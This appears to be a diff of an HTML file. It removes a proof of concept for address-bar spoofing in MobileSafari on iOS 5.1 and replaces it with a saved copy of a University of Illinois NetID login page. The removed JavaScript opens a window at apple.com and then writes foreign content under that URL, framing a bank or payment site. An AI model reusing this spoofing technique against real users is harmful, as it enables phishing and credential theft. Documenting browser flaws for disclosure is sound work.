@@ -1,23 +1,75 @@
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
-<html>
-	<head><title>MobileSafari iOS 5.1 - Adress bar spoofing poc</title>
-		<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
-	</head>
-	<body>
-		<fieldset>
-			<legend>Some payment/bank website included here.</legend>
-			<ol>
-				<li>start poc<xmp>click the button to run the poc.</xmp><button id="one">Demo</button></li>
-			</ol>
-		</fieldset>
-		<script type="text/javascript">
-			document.getElementById('one').onclick = function() {
-				myWindow=window.open('https://www.apple.com','eintitel','width=200,height=100,location=yes');
-				myWindow.document.write("<html><head></head><body><strong>This is still hosted on MajorSecurity.net, but the the adressbar is being spoofed and is pointing to another FQDN. scary.</strong><br><br><iframe src=\"http://www.apple.com\");></iframe></scri+pt></body></html>");
-				myWindow.focus();
-			  return false;
-			}
-		</script>
-		<br><br><br><iframe id="ifR1" name="ifR1" width="100px" height="50px" src="https://facebook.com/"></iframe>
-	</body>
-</html>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-5">
+    <title>University of Illinois :: Bluestem Web Login Service :: You must log in to continue</title>
+
+    <meta http-equiv="Content-Style-Type" content="text/css">
+    <meta http-equiv="Content-Script-Type" content="text/javascript">
+    <link rel="stylesheet" href="/stylesheets/bluestem.css" type="text/css">
+  </head>
+
+  <body onload="setfocus()">
+
+    <div id="container">
+      <h1>You must log in to continue.</h1>
+
+      <div class="inputBox blue">
+        <form name="userid" id="userid" method="POST" action="https://www-s1.illinois.edu/bluestem/login.cgi">
+          <div class="formLabelBox">
+          <label for="UserID">Enter your NetID:</label>
+          <input type="text" size="15" maxlength="64" name="UserID" id="UserID" value="">
+          <input type="submit" value="Continue">
+          <input type="hidden" name="return" value="696c6c696e6f69732e6564752f626c75657374656d2f6c625f6c6f67696e2e6367692f626c6f672f6469616c6f6745646974417574682f3839342f37313730343f414354494f4e3d4449414c4f475f414444">
+          <input type="hidden" name="cacheid" value="1332456731-17336">
+          <input type="hidden" name="RetrieveURL" value="68747470733a2f2f696c6c696e6f69732e6564752f626c75657374656d2f72657472696576655f617574682e636769">
+          <input type="hidden" name="RPCVersion" value="1.1">
+          <input type="hidden" name="RPCURL" value="/bluestem/bluerpc.cgi">
+
+          <input type="hidden" name="BSVersion" value="1.6.5">
+          <input type="hidden" name="BSVersionHash" value="2b3639bbcd5f1070f46c65b6d4b20393d8df6ec9">
+          </div>
+        </form>
+      </div>
+
+      <div class="underBoxText">
+        <p><strong>UIC and UIS visitors:</strong><br>
+          Add <em>@uic.edu</em> or <em>@uis.edu</em> to your UIC or UIS NetID.<br>
+          For example, if your UIC NetID is <strong>joan</strong>, enter <strong>joan@uic.edu</strong>.</p>
+        <p><strong>Forgot your NetID password?</strong><br>
+          To change or reset your NetID password, go to the <a href="http://passwords.cites.uiuc.edu/" target="_blank">CITES Password Manager</a> page.</p>
+      </div>
+
+      <div id="moreInfo">
+        <hr>
+        <h2>More Information</h2>
+
+        <div id="sideBox">
+          <h3>Technical Information</h3>
+          <p>The server that has just now requested your NetID is shown below.</p>
+          <p>Server: <strong>illinois.edu</strong></p>
+          <p>Server Description: <strong>Office of Web Services</strong></p>
+          <p>Application URL: <strong>/bluestem/lb_login.cgi/blog/dialogEditAuth/894/71704?ACTION=DIALOG_ADD</strong></p>
+        </div>
+
+        <h3>Where to Get Help</h3>
+        		<ul>
+					<li><strong>Urbana campus: </strong>Contact the <a href="http://www.cites.uiuc.edu/help/">CITES Help Desk</a> at <a href="mailto:consult@illinois.edu">consult@illinois.edu</a></li>
+					<li><strong>Chicago campus:</strong> Contact ACCC at (312) 413-0003 or <a href="mailto:consult@uic.edu">consult@uic.edu</a></li>
+					<li><strong>Springfield campus:</strong> Contact Information Technology Services at 217-206-6000 or <a href="mailto:techsupport@uis.edu">techsupport@uis.edu</a></li>				
+				</ul>
+
+		<h3>What Is a NetID?</h3>
+				<p>Your NetID serves as your login to many University computing and networking services and also determines your University email address, which is netid@illinois.edu.</p>
+				
+				<p>For more information, see the <a href="http://www.cites.uiuc.edu/netid/">Your Network ID (NetID)</a> page.</p>
+      </div>
+
+      <div id="footer">
+        <hr>
+        <p class="small"><a href="http://www.cites.uiuc.edu/help/" target="_blank">CITES Help Desk</a> - <a href="mailto:consult@uiuc.edu">consult@uiuc.edu</a></p>
+      </div>
+
+    </div>
+
+  
+
+</body></html>
